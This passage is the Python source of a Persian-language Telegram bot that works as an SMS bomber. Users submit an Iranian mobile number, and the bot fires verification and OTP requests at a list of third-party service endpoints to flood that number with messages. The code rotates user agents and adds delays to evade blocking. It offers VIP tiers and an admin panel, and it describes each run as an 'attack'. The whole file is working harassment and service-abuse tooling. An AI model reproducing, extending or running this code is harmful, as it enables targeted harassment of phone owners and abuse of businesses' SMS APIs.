        "url": "https://tajtehran.com/RegisterRequest",
        "data": {"mobile": "PHONE_NUMBER", "password": "mamad1234"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Paklean Voice",
        "url": "https://client.api.paklean.com/user/resendVoiceCode",
        "data": {"username": "PHONE_NUMBER"}
    },
    {
        "name": "Digimaze OTP",
        "url": "https://digimaze.org/api/sms/v1/otp/request",
        "data": {"phone": "PHONE_NUMBER"}
    }
]

# ========== توابع کمکی برای APIها ==========
def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
    ]
    return random.choice(agents)

def prepare_api_data(api, phone):
    phone_without_0 = phone[1:]
    phone_with_prefix = f"+98{phone_without_0}"
    
    if not isinstance(api["data"], dict):
        return api["data"]
        
    data = api["data"].copy()
    
    def replace_phone(obj):
        if isinstance(obj, dict):
            return {k: replace_phone(v) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [replace_phone(item) for item in obj]
        elif isinstance(obj, str):
            if obj == "PHONE_NUMBER":
                return phone
            elif obj == "PHONE_NUMBER_WITHOUT_0":
                return phone_without_0
            elif obj == "+98PHONE_NUMBER_WITHOUT_0":
                return phone_with_prefix
            elif "RANDOM" in obj:
                return obj.replace("RANDOM", str(random.randint(100, 999)))
            else:
                return obj
        else:
            return obj
            
    return replace_phone(data)

def send_api_request(api, phone):
    try:
        time.sleep(random.uniform(0.3, 1.0))
        
        api_data = prepare_api_data(api, phone)
        method = api.get("method", "POST")
        url = api["url"]
        
        if "params" in api:
            url += "?" + "&".join([f"{k}={v}" for k, v in api["params"].items()])
        
        headers = {"User-Agent": get_random_user_agent()}
        if api.get("headers"):
            headers.update(api["headers"])
        
        content_type = headers.get("content-type", "").lower()
        
        if "multipart/form-data" in content_type:
            files = {}
            for key, value in api_data.items():
                if value is not None:
                    files[key] = (None, str(value))
            response = requests.post(url, headers=headers, files=files, timeout=5)
        elif "application/x-www-form-urlencoded" in content_type:
            response = requests.post(url, headers=headers, data=api_data, timeout=5)
        elif method == "GET":
            response = requests.get(url, headers=headers, params=api_data, timeout=5)
        else:
            headers["Content-Type"] = "application/json"
            response = requests.post(url, headers=headers, json=api_data, timeout=5)
        
        return response.status_code in [200, 201, 202, 204]
    except Exception as e:
        return False

# ========== تابع حمله اصلی ==========
def run_attack(phone, chat_id, msg_id):
    try:
        bot.edit_message_text(
            f"🔥 در حال ارسال پیامک به {phone}...\n⏱ لطفاً صبر کنید...",
            chat_id, 
            msg_id
        )
    except:
        pass
    
    total_apis = len(APIS)
    success_count = 0
    
    for i, api in enumerate(APIS):
        if chat_id in active_attacks and not active_attacks[chat_id]:
            try:
                bot.edit_message_text("⛔ حمله توسط کاربر متوقف شد.", chat_id, msg_id)
            except:
                pass
            if chat_id in active_attacks:
                del active_attacks[chat_id]
            return
        
        if send_api_request(api, phone):
            success_count += 1
        
        if (i + 1) % 10 == 0:
            try:
                bot.edit_message_text(
                    f"📱 شماره: {phone[:4]}****{phone[-4:]}\n"
                    f"📊 پیشرفت: {i + 1}/{total_apis}\n"
                    f"✅ موفق: {success_count}\n"
                    f"❌ ناموفق: {i + 1 - success_count}",
                    chat_id, 
                    msg_id
                )
            except:
                pass
    
    percent = int((success_count / total_apis) * 100) if total_apis > 0 else 0
    
    final_msg = f"""✅ **حمله با موفقیت انجام شد!**

📱 شماره: {phone[:4]}****{phone[-4:]}
✅ موفق: {success_count}
❌ ناموفق: {total_apis - success_count}
📊 مجموع: {total_apis}
📈 درصد موفقیت: {percent}%

👑 {CREATOR_USERNAME}"""
    
    try:
        bot.edit_message_text(final_msg, chat_id, msg_id, parse_mode="Markdown")
    except:
        try:
            bot.send_message(chat_id, final_msg, parse_mode="Markdown")
        except:
            pass
    finally:
        if chat_id in active_attacks:
            del active_attacks[chat_id]

# ========== راه‌اندازی دیتابیس ==========
def init_database():
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS vip_users (user_id INTEGER PRIMARY KEY)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_daily (user_id INTEGER, date TEXT, count INTEGER, PRIMARY KEY (user_id, date))''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_messages (user_id INTEGER PRIMARY KEY, count INTEGER)''')
        c.execute('''CREATE TABLE IF NOT EXISTS user_last_use (user_id INTEGER PRIMARY KEY, last_use INTEGER)''')
        
        for admin_id in ADMIN_IDS:
            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (admin_id,))
        
        conn.commit()
        conn.close()
        return True
    except:
        return False

# ========== توابع دیتابیس ==========
def get_user_daily(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        today = datetime.now().date().isoformat()
        c.execute("SELECT count FROM user_daily WHERE user_id = ? AND date = ?", (user_id, today))
        result = c.fetchone()
        conn.close()
        return result[0] if result else 0
    except:
        return 0

def update_user_daily(user_id, count):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        today = datetime.now().date().isoformat()
        c.execute("INSERT OR REPLACE INTO user_daily (user_id, date, count) VALUES (?, ?, ?)",
                  (user_id, today, count))
        conn.commit()
        conn.close()
    except:
        pass

def increment_user_daily(user_id):
    current = get_user_daily(user_id)
    update_user_daily(user_id, current + 1)

def get_user_last_use(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT last_use FROM user_last_use WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result[0] if result else 0
    except:
        return 0

def set_user_last_use(user_id, timestamp):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO user_last_use (user_id, last_use) VALUES (?, ?)",
                  (user_id, timestamp))
        conn.commit()
        conn.close()
    except:
        pass

def increment_user_messages(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO user_messages (user_id, count) VALUES (?, ?)",
                  (user_id, 1))
        conn.commit()
        conn.close()
    except:
        pass

# ========== توابع مدیریت ==========
def is_admin(user_id):
    if user_id in ADMIN_IDS:
        return True
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result is not None
    except:
        return False

def is_vip(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM vip_users WHERE user_id = ?", (user_id,))
        result = c.fetchone()
        conn.close()
        return result is not None
    except:
        return False

def add_vip(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO vip_users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def remove_vip(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("DELETE FROM vip_users WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def add_admin(user_id):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def remove_admin(user_id):
    if user_id in ADMIN_IDS:
        return False
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
        conn.commit()
        conn.close()
        return True
    except:
        return False

def get_all_admins():
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM admins")
        results = [row[0] for row in c.fetchall()]
        conn.close()
        for admin_id in ADMIN_IDS:
            if admin_id not in results:
                results.append(admin_id)
        return results
    except:
        return ADMIN_IDS

def get_all_vips():
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM vip_users")
        results = [row[0] for row in c.fetchall()]
        conn.close()
        return results
    except:
        return []

def get_daily_limit(user_id):
    return DAILY_LIMIT_VIP if is_vip(user_id) else DAILY_LIMIT_NORMAL

def check_daily_limit(user_id):
    today_used = get_user_daily(user_id)
    limit = get_daily_limit(user_id)
    return today_used < limit

def hash_phone(phone):
    return hashlib.sha256(phone.encode()).hexdigest()

def is_phone_blocked(phone):
    phone_hash = hash_phone(phone)
    return phone_hash in BLOCKED_PHONE_HASHES

# ========== خوش‌آمدگویی ==========
def get_welcome_message(user):
    name = user.first_name or "عزیز"
    today_used = get_user_daily(user.id)
    limit = get_daily_limit(user.id)
    vip_status = "⭐ VIP" if is_vip(user.id) else "👤 عادی"
    
    return f"""🎯 **به {BOT_NAME} خوش اومدی {name}!**

🔥 **ساخته شده توسط {CREATOR_USERNAME}**
{vip_status}
📊 استفاده امروز: {today_used}/{limit}

📱 **قابلیت‌ها:**
• ارسال پیامک به بیش از {len(APIS)} سرویس ایرانی
• محدودیت روزانه: {limit} بار
• گزارش لحظه‌ای از تعداد پیامک‌ها
• قابلیت توقف حمله

🔽 برای شروع از دکمه‌های زیر استفاده کن.
"""

# ========== استارت ==========
@bot.message_handler(commands=['start'])
def start(message):
    global bot_active
    user_id = message.from_user.id
    
    if not bot_active and not is_admin(user_id):
        bot.reply_to(message, "⛔ ربات در حال حاضر غیرفعال است.")
        return
    
    increment_user_messages(user_id)
    
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton('🚀 حمله جدید')
    btn2 = types.KeyboardButton('📊 وضعیت من')
    btn3 = types.KeyboardButton('📈 آمار کلی')
    btn4 = types.KeyboardButton('⛔ توقف حمله')
    btn5 = types.KeyboardButton('📞 ارتباط با سازنده')
    
    if is_admin(user_id):
        btn6 = types.KeyboardButton('👑 پنل مدیریت')
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    else:
        markup.add(btn1, btn2, btn3, btn4, btn5)
    
    bot.send_message(message.chat.id, get_welcome_message(message.from_user), reply_markup=markup, parse_mode="Markdown")

# ========== وضعیت من ==========
@bot.message_handler(func=lambda m: m.text == '📊 وضعیت من')
def my_status(m):
    user_id = m.chat.id
    today_used = get_user_daily(user_id)
    limit = get_daily_limit(user_id)
    vip_status = "⭐ VIP" if is_vip(user_id) else "👤 عادی"
    last_use = get_user_last_use(user_id)
    
    status_text = f"""📊 **وضعیت شما:**

👤 کاربر: {m.from_user.first_name}
{vip_status}
📅 استفاده امروز: {today_used} بار
✅ باقیمانده: {limit - today_used} بار
⚡ محدودیت روزانه: {limit} بار
"""
    
    if user_id in active_attacks and active_attacks[user_id]:
        status_text += "\n⚠️ **حمله در حال انجام هست!**"
    else:
        status_text += "\n✅ **آماده برای حمله جدیدی!**"
    
    if last_use:
        time_diff = int(time.time() - last_use)
        if time_diff < 120:
            wait = 120 - time_diff
            status_text += f"\n⏳ زمان انتظار تا حمله بعد: {wait} ثانیه"
    
    status_text += f"\n\n👑 {CREATOR_USERNAME}"
    
    bot.reply_to(m, status_text, parse_mode="Markdown")

# ========== آمار کلی ==========
@bot.message_handler(func=lambda m: m.text == '📈 آمار کلی')
def global_stats(m):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily")
        total_users = c.fetchone()[0]
        
        today = datetime.now().date().isoformat()
        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE date = ?", (today,))
        today_users = c.fetchone()[0]
        
        c.execute("SELECT SUM(count) FROM user_messages")
        total_messages = c.fetchone()[0] or 0
        
        conn.close()
        
        vip_count = len(get_all_vips())
        
        msg = f"""📊 **آمار کلی ربات:**

👥 کاربران کل: {total_users}
📅 کاربران امروز: {today_users}
⭐ کاربران VIP: {vip_count}
📨 کل درخواست‌ها: {total_messages}
⚡ محدودیت عادی: {DAILY_LIMIT_NORMAL} بار
⚡ محدودیت VIP: {DAILY_LIMIT_VIP} بار
📡 تعداد APIها: {len(APIS)}

👑 **ساخته شده توسط {CREATOR_USERNAME}**"""
        
        bot.reply_to(m, msg, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(m, "❌ خطا در دریافت آمار.")

# ========== حمله جدید ==========
@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
def new_attack(m):
    global bot_active
    user_id = m.chat.id
    limit = get_daily_limit(user_id)
    
    if not bot_active and not is_admin(user_id):
        bot.reply_to(m, "⛔ ربات غیرفعال است.")
        return
    
    if not check_daily_limit(user_id) and not is_admin(user_id):
        bot.reply_to(m, f"⚠️ محدودیت روزانه تموم شد! فردا {limit} بار دیگه می‌تونی استفاده کنی.")
        return
    
    last_use = get_user_last_use(user_id)
    if last_use:
        time_diff = int(time.time() - last_use)
        if time_diff < 120 and not is_admin(user_id):
            remaining = 120 - time_diff
            bot.reply_to(m, f"⏳ {remaining} ثانیه صبر کن بین هر حمله.")
            return
    
    if user_id in active_attacks and active_attacks[user_id]:
        bot.reply_to(m, "⚠️ الان یه حمله فعال داری!")
        return
    
    user_states[user_id] = "waiting_for_phone"
    today_used = get_user_daily(user_id)
    remaining = limit - today_used
    bot.reply_to(m, f"📱 **شماره موبایل رو بفرست:**\n(مثلاً 09123456789)\n📊 باقیمانده امروز: {remaining} بار")

# ========== دریافت شماره ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "waiting_for_phone")
def get_phone(m):
    user_id = m.chat.id
    phone = m.text.strip()
    
    if not re.match(r'^09\d{9}$', phone):
        bot.reply_to(m, "❌ شماره نامعتبر! باید ۱۱ رقم و با ۰۹ شروع بشه.")
        del user_states[user_id]
        return
    
    if is_phone_blocked(phone):
        bot.reply_to(m, "❌ خطای 404: شماره مورد نظر یافت نشد.")
        del user_states[user_id]
        return
    
    del user_states[user_id]
    set_user_last_use(user_id, int(time.time()))
    active_attacks[user_id] = True
    
    increment_user_daily(user_id)
    increment_user_messages(user_id)
    
    today_used = get_user_daily(user_id)
    limit = get_daily_limit(user_id)
    remaining = limit - today_used
    
    msg = bot.reply_to(
        m, 
        f"✅ شماره {phone} دریافت شد.\n🔥 در حال ارسال پیامک...\n📊 باقیمانده امروز: {remaining} بار"
    )
    
    threading.Thread(target=run_attack, args=(phone, user_id, msg.message_id)).start()

# ========== توقف حمله ==========
@bot.message_handler(func=lambda m: m.text == '⛔ توقف حمله')
def stop_attack(m):
    user_id = m.chat.id
    if user_id in active_attacks:
        active_attacks[user_id] = False
        bot.reply_to(m, "⛔ حمله متوقف شد.")
    else:
        bot.reply_to(m, "❌ حمله فعالی نیست.")

# ========== پنل مدیریت ==========
@bot.message_handler(func=lambda m: m.text == '👑 پنل مدیریت' and is_admin(m.from_user.id))
def admin_panel(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('📊 آمار مدیریت', '📋 لیست VIPها', '🔴 خاموش/روشن')
    markup.add('👥 مدیریت ادمین‌ها', '⭐ مدیریت VIPها', '🔙 برگشت')
    bot.reply_to(m, "👑 پنل مدیریت:", reply_markup=markup)

# ========== آمار مدیریت ==========
@bot.message_handler(func=lambda m: m.text == '📊 آمار مدیریت' and is_admin(m.from_user.id))
def admin_stats(m):
    try:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily")
        total_users = c.fetchone()[0]
        
        today = datetime.now().date().isoformat()
        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE date = ?", (today,))
        today_users = c.fetchone()[0]
        
        c.execute("SELECT SUM(count) FROM user_messages")
        total_messages = c.fetchone()[0] or 0
        
        c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE count > 0")
        active_users = c.fetchone()[0]
        
        conn.close()
        
        status = "✅ فعال" if bot_active else "❌ غیرفعال"
        vip_count = len(get_all_vips())
        admins = get_all_admins()
        admin_count = len(admins)
        
        msg = f"""📊 **آمار مدیریت:**
        
👤 کاربران کل: {total_users}
📅 کاربران امروز: {today_users}
⚡ کاربران فعال: {active_users}
⭐ VIPها: {vip_count}
👑 ادمین‌ها: {admin_count}
📨 کل پیام‌ها: {total_messages}
📡 تعداد APIها: {len(APIS)}
🔰 وضعیت ربات: {status}
👑 سازنده: {CREATOR_USERNAME}
"""
        bot.reply_to(m, msg, parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(m, "❌ خطا در دریافت آمار.")

# ========== لیست VIPها ==========
@bot.message_handler(func=lambda m: m.text == '📋 لیست VIPها' and is_admin(m.from_user.id))
def vip_list(m):
    vips = get_all_vips()
    if not vips:
        bot.reply_to(m, "📋 لیست VIPها خالی هست.")
        return
    
    text = "📋 **لیست VIPها:**\n\n"
    for uid in vips:
        text += f"⭐ `{uid}`\n"
    text += f"\n👑 {CREATOR_USERNAME}"
    bot.reply_to(m, text, parse_mode="Markdown")

# ========== خاموش/روشن کردن ربات ==========
@bot.message_handler(func=lambda m: m.text == '🔴 خاموش/روشن' and is_admin(m.from_user.id))
def admin_toggle(m):
    global bot_active
    bot_active = not bot_active
    status = "روشن" if bot_active else "خاموش"
    bot.reply_to(m, f"✅ ربات {status} شد.")

# ========== مدیریت ادمین‌ها ==========
@bot.message_handler(func=lambda m: m.text == '👥 مدیریت ادمین‌ها' and is_admin(m.from_user.id))
def manage_admins(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('➕ افزودن ادمین', '➖ حذف ادمین', '📋 لیست ادمین‌ها', '🔙 برگشت')
    bot.reply_to(m, "👥 مدیریت ادمین‌ها:", reply_markup=markup)

# ========== مدیریت VIPها ==========
@bot.message_handler(func=lambda m: m.text == '⭐ مدیریت VIPها' and is_admin(m.from_user.id))
def manage_vips(m):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('➕ افزودن VIP', '➖ حذف VIP', '📋 لیست VIPها', '🔙 برگشت')
    bot.reply_to(m, "⭐ مدیریت VIPها:", reply_markup=markup)

# ========== لیست ادمین‌ها ==========
@bot.message_handler(func=lambda m: m.text == '📋 لیست ادمین‌ها' and is_admin(m.from_user.id))
def list_admins(m):
    admins = get_all_admins()
    text = "📋 **لیست ادمین‌ها:**\n\n"
    for uid in admins:
        star = "⭐" if uid in ADMIN_IDS else ""
        text += f"{star}👑 `{uid}`\n"
    text += f"\n👑 {CREATOR_USERNAME}"
    bot.reply_to(m, text, parse_mode="Markdown")

# ========== افزودن ادمین ==========
@bot.message_handler(func=lambda m: m.text == '➕ افزودن ادمین' and is_admin(m.from_user.id))
def add_admin_start(m):
    msg = bot.reply_to(m, "🔹 **آیدی عددی کاربر مورد نظر را وارد کنید:**", parse_mode="Markdown")
    user_states[m.chat.id] = ("waiting_for_add_admin", msg.message_id)

# ========== حذف ادمین ==========
@bot.message_handler(func=lambda m: m.text == '➖ حذف ادمین' and is_admin(m.from_user.id))
def remove_admin_start(m):
    msg = bot.reply_to(m, "🔹 **آیدی عددی ادمین مورد نظر را وارد کنید:**", parse_mode="Markdown")
    user_states[m.chat.id] = ("waiting_for_remove_admin", msg.message_id)

# ========== افزودن VIP ==========
@bot.message_handler(func=lambda m: m.text == '➕ افزودن VIP' and is_admin(m.from_user.id))
def add_vip_start(m):
    msg = bot.reply_to(m, "🔹 **آیدی عددی کاربر مورد نظر را وارد کنید:**", parse_mode="Markdown")
    user_states[m.chat.id] = ("waiting_for_add_vip", msg.message_id)

# ========== حذف VIP ==========
@bot.message_handler(func=lambda m: m.text == '➖ حذف VIP' and is_admin(m.from_user.id))
def remove_vip_start(m):
    msg = bot.reply_to(m, "🔹 **آیدی عددی VIP مورد نظر را وارد کنید:**", parse_mode="Markdown")
    user_states[m.chat.id] = ("waiting_for_remove_vip", msg.message_id)

# ========== هندلر ورودی‌های مدیریت ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) and user_states[m.chat.id][0] in 
                     ["waiting_for_add_admin", "waiting_for_remove_admin", 
                      "waiting_for_add_vip", "waiting_for_remove_vip"])
def handle_admin_edit(m):
    state = user_states.get(m.chat.id)
    if not state:
        return
    
    user_id_str = m.text.strip()
    if not user_id_str.isdigit():
        bot.reply_to(m, "❌ لطفاً یک عدد معتبر وارد کنید.")
        return
    
    target_id = int(user_id_str)
    action = state[0]
    
    if action == "waiting_for_add_admin":
        if add_admin(target_id):
            bot.reply_to(m, f"✅ کاربر {target_id} با موفقیت به ادمین‌ها اضافه شد.")
        else:
            bot.reply_to(m, f"❌ خطا در افزودن کاربر {target_id}.")
    elif action == "waiting_for_remove_admin":
        if target_id in ADMIN_IDS:
            bot.reply_to(m, "❌ این کاربر جزو ادمین‌های ثابت است و قابل حذف نیست.")
        else:
            if remove_admin(target_id):
                bot.reply_to(m, f"✅ کاربر {target_id} از ادمین‌ها حذف شد.")
            else:
                bot.reply_to(m, f"❌ خطا در حذف کاربر {target_id}.")
    elif action == "waiting_for_add_vip":
        if add_vip(target_id):
            bot.reply_to(m, f"✅ کاربر {target_id} با موفقیت به VIPها اضافه شد.")
        else:
            bot.reply_to(m, f"❌ خطا در افزودن کاربر {target_id}.")
    elif action == "waiting_for_remove_vip":
        if remove_vip(target_id):
            bot.reply_to(m, f"✅ کاربر {target_id} از VIPها حذف شد.")
        else:
            bot.reply_to(m, f"❌ خطا در حذف کاربر {target_id}.")
    
    del user_states[m.chat.id]

# ========== برگشت ==========
@bot.message_handler(func=lambda m: m.text == '🔙 برگشت' and is_admin(m.from_user.id))
def admin_back(m):
    start(m)

# ========== ارتباط با سازنده ==========
@bot.message_handler(func=lambda m: m.text == '📞 ارتباط با سازنده')
def contact(m):
    markup = types.ForceReply(selective=False)
    msg = bot.reply_to(
        m, 
        f"📝 **پیامت رو بنویس، برات می‌فرستم برای سازنده:**\n\n👑 {CREATOR_USERNAME}",
        reply_markup=markup,
        parse_mode="Markdown"
    )
    user_states[m.chat.id] = ("waiting_for_contact", msg.message_id)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) and user_states[m.chat.id][0] == "waiting_for_contact")
def handle_contact_message(m):
    state = user_states.get(m.chat.id)
    if not state:
        return
    
    vip = "⭐ VIP" if is_vip(m.from_user.id) else "👤 عادی"
    user_info = f"از: {m.from_user.first_name} (ID: {m.from_user.id})\nوضعیت: {vip}"
    
    del user_states[m.chat.id]
    
    admins = get_all_admins()
    for admin_id in admins:
        try:
            bot.send_message(
                admin_id,
                f"📨 **پیام جدید از کاربر:**\n\n{user_info}\n\n📝 {m.text}\n\n👑 {CREATOR_USERNAME}",
                parse_mode="Markdown"
            )
        except:
            pass
    
    bot.reply_to(m, f"✅ پیامت با موفقیت ارسال شد. به زودی پاسخ می‌دم.\n👑 {CREATOR_USERNAME}")

# ========== پیام‌های ناشناخته ==========
@bot.message_handler(func=lambda m: True)
def fallback(m):
    if user_states.get(m.chat.id):
        return
    
    valid_buttons = ['🚀 حمله جدید', '📊 وضعیت من', '📈 آمار کلی', '⛔ توقف حمله', 
                     '📞 ارتباط با سازنده', '👑 پنل مدیریت', '📊 آمار مدیریت', 
                     '📋 لیست VIPها', '🔴 خاموش/روشن', '👥 مدیریت ادمین‌ها', 
                     '⭐ مدیریت VIPها', '➕ افزودن ادمین', '➖ حذف ادمین', 
                     '📋 لیست ادمین‌ها', '➕ افزودن VIP', '➖ حذف VIP', '🔙 برگشت']
    
    if m.text in valid_buttons:
        return
    
    bot.reply_to(m, "⚠️ لطفاً از دکمه‌های منو استفاده کن.")

# ========== تابع بیدار ماندن ==========
def keep_alive():
    while True:
        try:
            requests.get("https://www.google.com", timeout=5)
            print("✅ پینگ ارسال شد - بات بیداره")
        except:
            pass
        time.sleep(60)

# ========== اجرای اصلی ==========
if __name__ == "__main__":
    print("="*60)
    print(f"🚀 راه‌اندازی {BOT_NAME}")
    print("="*60)
    
    init_database()
    
    print("="*60)
    print("🤖 ربات آماده است")
    print(f"👑 ادمین‌ها: {ADMIN_IDS}")
    print(f"👑 سازنده: {CREATOR_USERNAME}")
    print(f"📡 تعداد APIها: {len(APIS)}")
    print("✅ سیستم ضد بلاک فعال شد")
    print("="*60)
    
    # استارت ترد بیدار ماندن
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # استارت بات به روش Polling
    print("🔄 بات در حال اجرا به روش Polling...")
    bot.infinity_polling(timeout=60, long_polling_timeout=30)
